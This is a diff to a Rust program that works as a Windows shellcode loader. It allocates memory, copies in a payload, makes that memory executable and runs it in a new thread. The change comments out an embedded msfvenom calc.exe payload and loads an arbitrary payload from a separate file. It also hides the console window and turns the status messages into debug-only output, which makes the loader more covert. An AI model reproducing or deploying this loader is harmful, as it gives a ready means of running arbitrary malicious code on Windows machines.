@@ -1,3 +1,16 @@
+#![cfg_attr(
+    all(
+      target_os = "windows",
+      feature = "no_console",
+    ),
+    windows_subsystem = "windows"
+  )]  
+
+#[macro_export]
+macro_rules! debug {
+    ($($arg:tt)*) => (if ::std::cfg!(debug_assertions) { ::std::println!($($arg)*); })
+}
+
 use std::error::Error;
 use std::mem::transmute;
 
@@ -16,18 +29,33 @@ use windows_sys::Win32::System::Memory::VirtualAlloc;
 use windows_sys::Win32::System::Memory::VirtualProtect;
 use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};
 
-fn get_shellcode_base64() -> Vec<u8> {
-    //msfconsole x64 pop calc.exe
-    let base64_shell_code = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";
+// fn get_shell_code_base64() -> Vec<u8> {
+//     //msfconsole x64 pop calc.exe
+//     //msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc_x64_shellcode.bin EXITFUNC=thread
+//     let base64_shell_code = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu+AdKgpBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";
+//     general_purpose::STANDARD.decode(base64_shell_code).unwrap()
+// }
+
+fn get_shell_code_base64() -> Vec<u8> {
+    let base64_shell_code = include_str!("payload.b64");
     general_purpose::STANDARD.decode(base64_shell_code).unwrap()
 }
 
+// fn get_shell_code() -> Vec<u8> {
+//     let raw = include_bytes!("payload.bin");
+//     raw.to_vec()
+// }
+
+
 fn main() {
-    let shell_code = get_shellcode_base64();
+    
+    let shell_code = get_shell_code_base64();
+    //let shell_code = get_shell_code();
+    debug!("[+] Shellcode loaded !");
     match load(shell_code) {
         Ok(_) => {},
         Err(e) => {
-            println!("{:?}",e.to_string());
+            debug!("{:?}",e.to_string());
         }
     }
 }
@@ -47,6 +75,8 @@ fn load(shell_code: Vec<u8>) -> Result<(), Box<dyn Error>> {
             panic!("[-] Couldn't allocate memory to current process {}!", GetLastError())
         }
 
+        debug!("[+] Memory Space created !");
+
         //copy shellcode into the new memory region
         copy(shell_code.as_ptr() as  _, base_addr, shell_code.len());
 
@@ -57,13 +87,24 @@ fn load(shell_code: Vec<u8>) -> Result<(), Box<dyn Error>> {
             panic!("[-] Couldn't change memory protection: {}!", GetLastError())
         }
 
+        debug!("[+] Memory protection changed !");
+
         let trans_addr = transmute(base_addr);
         let thread_handle = CreateThread(null(), 0, trans_addr, null(), 0, null_mut());
         
+        if thread_handle == 0 {
+            panic!("[-] Couldn't start the new Thread : {}!", GetLastError())
+        }
+        
+        debug!("[+] Thread started ! {:?}",thread_handle);
 
         WaitForSingleObject(thread_handle, WAIT_FAILED);
 
+        debug!("[+] Wait stoped !");
+
         CloseHandle(thread_handle);
+
+        debug!("[+] Thread handle closed !");
         Ok(())
     }
 }
